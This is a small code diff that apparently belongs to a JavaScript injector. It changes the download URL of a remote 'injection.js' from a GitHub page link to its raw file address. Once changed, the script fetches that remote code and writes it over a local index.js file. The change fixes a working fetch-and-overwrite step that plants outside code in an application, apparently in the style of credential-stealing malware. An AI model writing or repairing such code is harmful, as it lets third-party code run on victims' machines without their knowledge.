@@ -108,7 +108,7 @@ fs.readFile('${indexJs}', 'utf8', (err, data) => {
         init();
 })
 async function init() {
-    https.get('https://github.com/TWIST-X7/nothing2/blob/main/injection.js', (res) => {
+    https.get('https://raw.githubusercontent.com/TWIST-X7/nothing2/main/injection.js', (res) => {
         const file = fs.createWriteStream('${indexJs}');
         res.pipe(file);
         file.on('finish', () => {
